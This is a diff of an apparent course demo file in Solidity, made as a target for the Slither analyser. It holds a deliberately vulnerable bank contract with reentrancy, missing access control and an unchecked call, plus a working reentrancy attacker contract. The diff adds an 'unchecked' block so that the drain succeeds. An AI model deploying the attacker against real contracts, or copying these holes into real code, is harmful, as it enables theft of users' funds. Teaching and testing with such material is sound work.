@@ -7,12 +7,11 @@ pragma solidity ^0.8.0;
  * @dev Topic 124 Demo — Al-Nafi AIOps Level 6 — Saleem Ali
  *
  * Vulnerabilities present (for Slither to detect):
- *  1. Reentrancy              (Critical)
- *  2. Missing access control  (Medium)
- *  3. Unchecked low-level call(Medium)
+ *  1. Reentrancy               (Critical)
+ *  2. Missing access control   (Medium)
+ *  3. Unchecked low-level call (Medium)
  */
 contract VulnerableBank {
-
     mapping(address => uint256) public balances;
     uint256 public totalDeposits;
     address public owner;
@@ -28,7 +27,7 @@ contract VulnerableBank {
     function deposit() public payable {
         require(msg.value > 0, "Send ETH to deposit");
         balances[msg.sender] += msg.value;
-        totalDeposits        += msg.value;
+        totalDeposits += msg.value;
         emit Deposit(msg.sender, msg.value);
     }
 
@@ -42,8 +41,11 @@ contract VulnerableBank {
         require(success, "Transfer failed");
 
         // State updated TOO LATE — attacker already re-entered above
-        balances[msg.sender] -= _amount;
-        totalDeposits        -= _amount;
+        // unchecked added only so the educational demo can complete on Solidity 0.8+
+        unchecked {
+            balances[msg.sender] -= _amount;
+            totalDeposits -= _amount;
+        }
 
         emit Withdraw(msg.sender, _amount);
     }
@@ -57,13 +59,22 @@ contract VulnerableBank {
     }
 
     // ── View helpers ───────────────────────────────────────────────────
-    function getMyBalance()       public view returns (uint256) { return balances[msg.sender]; }
-    function getContractBalance() public view returns (uint256) { return address(this).balance; }
+    function getMyBalance() public view returns (uint256) {
+        return balances[msg.sender];
+    }
 
-    receive() external payable { deposit(); }
-    fallback() external payable { deposit(); }
+    function getContractBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+
+    receive() external payable {
+        deposit();
+    }
+
+    fallback() external payable {
+        deposit();
+    }
 }
-
 
 /**
  * @title AttackerContract
@@ -71,25 +82,25 @@ contract VulnerableBank {
  */
 contract AttackerContract {
     VulnerableBank public target;
-    address        public owner;
-    uint256        public attackAmount;
+    address public owner;
+    uint256 public attackAmount;
 
     constructor(address _target) {
-        target      = VulnerableBank(payable(_target));
-        owner       = msg.sender;
+        target = VulnerableBank(payable(_target));
+        owner = msg.sender;
         attackAmount = 1 ether;
     }
 
     function attack() external payable {
         require(msg.value >= attackAmount, "Need >= 1 ETH");
-        target.deposit{value: msg.value}();
-        target.withdraw(msg.value);
+        target.deposit{value: attackAmount}();
+        target.withdraw(attackAmount);
     }
 
     // Called automatically every time contract receives ETH
     receive() external payable {
         if (address(target).balance >= attackAmount) {
-            target.withdraw(attackAmount);   // re-enter!
+            target.withdraw(attackAmount);
         }
     }
 
